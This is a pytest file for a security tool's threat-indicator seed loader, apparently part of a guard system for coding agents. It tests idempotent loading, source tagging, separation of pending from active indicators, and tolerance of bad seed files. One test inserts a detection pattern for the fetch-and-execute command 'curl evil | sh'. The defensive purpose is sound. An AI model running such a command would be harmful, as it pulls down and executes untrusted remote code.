"""ТЗ-05: seed → ThreatIndicator loader — idempotent, multi-source, Path-2-ready."""
from __future__ import annotations

from pathlib import Path

import yaml
from sqlmodel import Session, select

from ccguard.server.db.models import ThreatIndicator
from ccguard.server.db.session import init_db, make_engine
from ccguard.server.services import indicator_seed_service


def _engine(tmp_path):
    eng = make_engine(f"sqlite:///{tmp_path}/seed.db")
    init_db(eng)
    return eng


def _seed_count() -> int:
    path = indicator_seed_service.default_seed_path()
    data = yaml.safe_load(path.read_text())
    return len(data["indicators"])


# --- AC2: seed loads + idempotent --------------------------------------------


def test_seed_loads_all_rows(tmp_path) -> None:
    eng = _engine(tmp_path)
    with Session(eng) as s:
        inserted = indicator_seed_service.load_seed(s)
        rows = s.exec(select(ThreatIndicator)).all()
    assert inserted == _seed_count()
    assert len(rows) == _seed_count()


def test_double_load_is_idempotent(tmp_path) -> None:
    eng = _engine(tmp_path)
    with Session(eng) as s:
        indicator_seed_service.load_seed(s)
        first = len(s.exec(select(ThreatIndicator)).all())
        second_inserted = indicator_seed_service.load_seed(s)
        total = len(s.exec(select(ThreatIndicator)).all())
    assert second_inserted == 0
    assert total == first


# --- AC3: multi-source --------------------------------------------------------


def test_multiple_sources_present(tmp_path) -> None:
    eng = _engine(tmp_path)
    with Session(eng) as s:
        indicator_seed_service.load_seed(s)
        sources = {r.source for r in s.exec(select(ThreatIndicator)).all()}
    assert {"os-standard", "atomic-red-team", "manual"} <= sources


# --- AC4: Path-2 structure (pending separated from active) -------------------


def test_pending_indicator_excluded_from_active_query(tmp_path) -> None:
    eng = _engine(tmp_path)
    with Session(eng) as s:
        indicator_seed_service.load_seed(s)
        # A future autosource (Path 2) inserts a pending row — schema accepts it
        # with NO change, and it must NOT appear in the enabled+active view.
        s.add(
            ThreatIndicator(
                indicator_type="dangerous_command",
                value="curl evil | sh",
                value_kind="regex",
                source="llm-proposed",
                status="pending",
                enabled=True,
            )
        )
        s.commit()
        active = s.exec(
            select(ThreatIndicator)
            .where(ThreatIndicator.status == "active")
            .where(ThreatIndicator.enabled == True)  # noqa: E712
        ).all()
    assert all(r.status == "active" for r in active)
    assert not any(r.source == "llm-proposed" for r in active)


# --- AC5/AC6: type + technique --------------------------------------------------


def test_type_filter_returns_clean_subsets(tmp_path) -> None:
    eng = _engine(tmp_path)
    with Session(eng) as s:
        indicator_seed_service.load_seed(s)
        sens = s.exec(
            select(ThreatIndicator).where(
                ThreatIndicator.indicator_type == "sensitive_path"
            )
        ).all()
        safe = s.exec(
            select(ThreatIndicator).where(
                ThreatIndicator.indicator_type == "safe_path"
            )
        ).all()
    assert sens and all(r.indicator_type == "sensitive_path" for r in sens)
    assert safe and all(r.indicator_type == "safe_path" for r in safe)


def test_techniques_are_populated(tmp_path) -> None:
    eng = _engine(tmp_path)
    with Session(eng) as s:
        indicator_seed_service.load_seed(s)
        techniques = {
            r.technique
            for r in s.exec(select(ThreatIndicator)).all()
            if r.technique
        }
    assert any(t.startswith("T1552") for t in techniques)  # coverage map seed


def test_platform_relevant_flag_present(tmp_path) -> None:
    eng = _engine(tmp_path)
    with Session(eng) as s:
        indicator_seed_service.load_seed(s)
        rows = s.exec(
            select(ThreatIndicator).where(
                ThreatIndicator.platform_relevant == True  # noqa: E712
            )
        ).all()
    assert rows  # filtering by relevance works


# --- AC8: broken seed never crashes startup ----------------------------------


def test_missing_seed_file_returns_zero(tmp_path) -> None:
    eng = _engine(tmp_path)
    with Session(eng) as s:
        n = indicator_seed_service.load_seed(s, seed_path=tmp_path / "nope.yaml")
        rows = s.exec(select(ThreatIndicator)).all()
    assert n == 0
    assert rows == []


def test_corrupt_seed_file_returns_zero(tmp_path) -> None:
    bad = tmp_path / "bad.yaml"
    bad.write_text("{ not: valid: yaml: ::::")
    eng = _engine(tmp_path)
    with Session(eng) as s:
        n = indicator_seed_service.load_seed(s, seed_path=bad)
    assert n == 0
